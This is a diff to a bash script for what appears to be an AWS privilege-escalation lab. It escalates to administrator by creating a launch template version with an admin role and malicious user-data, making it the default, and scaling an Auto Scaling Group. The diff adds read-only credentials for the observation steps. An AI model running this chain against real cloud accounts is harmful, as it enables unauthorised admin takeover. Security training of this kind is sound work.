@@ -69,6 +69,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -79,18 +88,29 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -105,15 +125,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -123,8 +145,9 @@ else
 fi
 echo ""
 
-# Step 5: Inspect the existing launch template
+# [EXPLOIT] Step 5: Inspect the existing launch template
 echo -e "${YELLOW}Step 5: Inspecting the victim launch template${NC}"
+use_starting_creds
 echo "Target launch template: $VICTIM_TEMPLATE_NAME"
 echo ""
 
@@ -183,8 +206,9 @@ USER_DATA_B64=$(echo "$USER_DATA" | base64 | tr -d '\n')
 
 echo -e "${GREEN}✓ Malicious user-data script prepared${NC}\n"
 
-# Step 7: Create new launch template version with admin role and malicious user data
+# [EXPLOIT] Step 7: Create new launch template version with admin role and malicious user data
 echo -e "${YELLOW}Step 7: Creating new launch template version with admin role${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector - using CreateLaunchTemplateVersion..."
 echo "Instance profile: $TARGET_ADMIN_PROFILE"
 echo ""
@@ -226,8 +250,9 @@ fi
 echo "Created new launch template version: $NEW_VERSION_NUMBER"
 echo -e "${GREEN}✓ New version created with admin role and malicious user data${NC}\n"
 
-# Step 8: Modify launch template to use the new version as default
+# [EXPLOIT] Step 8: Modify launch template to use the new version as default
 echo -e "${YELLOW}Step 8: Modifying launch template to set new version as default${NC}"
+use_starting_creds
 echo "Using ec2:ModifyLaunchTemplate to update the default version..."
 echo ""
 
@@ -241,11 +266,13 @@ aws ec2 modify-launch-template \
 echo "Updated default version from $ORIGINAL_DEFAULT_VERSION to $NEW_VERSION_NUMBER"
 echo -e "${GREEN}✓ Launch template default version modified${NC}\n"
 
-# Step 9: Trigger instance launch via Auto Scaling Group
+# [EXPLOIT] Step 9: Trigger instance launch via Auto Scaling Group
 echo -e "${YELLOW}Step 9: Triggering instance launch via Auto Scaling Group${NC}"
+use_starting_creds
 echo "Setting ASG desired capacity to 1 to trigger instance launch..."
 echo ""
 
+show_attack_cmd "Attacker" "aws autoscaling set-desired-capacity --region $AWS_REGION --auto-scaling-group-name $VICTIM_ASG_NAME --desired-capacity 1 --output text"
 aws autoscaling set-desired-capacity \
     --region $AWS_REGION \
     --auto-scaling-group-name $VICTIM_ASG_NAME \
@@ -254,8 +281,9 @@ aws autoscaling set-desired-capacity \
 
 echo -e "${GREEN}✓ Auto Scaling Group capacity updated${NC}\n"
 
-# Step 10: Wait for instance to launch
+# [OBSERVATION] Step 10: Wait for instance to launch
 echo -e "${YELLOW}Step 10: Waiting for instance to launch${NC}"
+use_readonly_creds
 echo "This may take 1-2 minutes..."
 echo ""
 
@@ -275,7 +303,7 @@ while [ $WAIT_TIME -lt $MAX_WAIT ]; do
 
     if [ "$INSTANCE_COUNT" -gt 0 ]; then
         INSTANCE_ID=$(echo "$ASG_INSTANCES" | jq -r '.[0].InstanceId')
-        show_cmd "Attacker" "aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].State.Name' --output text"
+        show_cmd "ReadOnly" "aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].State.Name' --output text"
         INSTANCE_STATE=$(aws ec2 describe-instances \
             --region $AWS_REGION \
             --instance-ids $INSTANCE_ID \
@@ -301,8 +329,9 @@ if [ -z "$INSTANCE_ID" ] || [ "$INSTANCE_ID" = "null" ]; then
     exit 1
 fi
 
-# Step 11: Wait for user-data script to attach AdministratorAccess
+# [OBSERVATION] Step 11: Wait for user-data script to attach AdministratorAccess
 echo -e "${YELLOW}Step 11: Waiting for user-data script to attach AdministratorAccess${NC}"
+use_readonly_creds
 echo "This may take 2-3 minutes while the instance executes the malicious script..."
 echo ""
 
@@ -335,12 +364,13 @@ if [ "$POLICY_ATTACHED" = false ]; then
     exit 1
 fi
 
-# Step 12: Verify administrator access
+# [OBSERVATION] Step 12: Verify administrator access
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
+use_readonly_creds
 echo "The starting user now has AdministratorAccess attached..."
 echo "Attempting to list IAM users..."
 
-show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
